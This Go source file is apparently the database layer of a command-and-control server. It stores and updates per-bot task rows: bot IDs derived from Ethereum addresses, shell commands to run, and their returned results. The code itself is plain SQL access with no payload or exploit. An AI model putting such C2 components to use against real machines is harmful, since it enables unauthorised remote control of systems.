/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package db

import (
	"fmt"
	"time"
)

// Task strcture is responsible for presentation of tasks table rows
type Task struct {
	ID           int       // ID is row ID
	BotID        string    // BotID -- sha1(ether address)
	KnockID      uint32    // KnockID is used to track bot call order
	TaskID       uint32    // TaskID is a number that tells system how to process the request
	TaskContent  string    // TaskContent could be cmd shell command, or anything else related to the task
	TaskResponse string    // TaskResponse will store last command results
	LastCheckIn  time.Time // LastCheckIn has latest update timestamp
}

// GetTask loads the task row from tasks based on BotID
func GetTask(botID string) (*Task, error) {
	var task = new(Task)
	taskRow := Conn.QueryRow("SELECT * from tasks where botId=?", botID)
	if err := taskRow.Scan(&task.ID, &task.BotID, &task.KnockID,
		&task.TaskID, &task.TaskContent, &task.TaskResponse, &task.LastCheckIn); err != nil {
		return nil, err
	}
	return task, nil
}

// PutTask saves the task row into tasks based on BotID
func PutTask(task *Task) error {
	stmt, err := Conn.Prepare("update tasks set knockId=?, taskId=?, taskContent=?, taskResponse=?, lastCheckIn=CURRENT_TIMESTAMP() where botId=?")
	if err != nil {
		return err
	}
	res, err := stmt.Exec(task.KnockID, task.TaskID, task.TaskContent, task.TaskResponse, task.BotID)
	if err != nil {
		return err
	}
	affect, err := res.RowsAffected()
	if err != nil {
		return err
	}
	if affect == 0 {
		return fmt.Errorf("[-] %s\tNo rows were affected, wrong botId?", task.BotID)
	}
	return nil
}
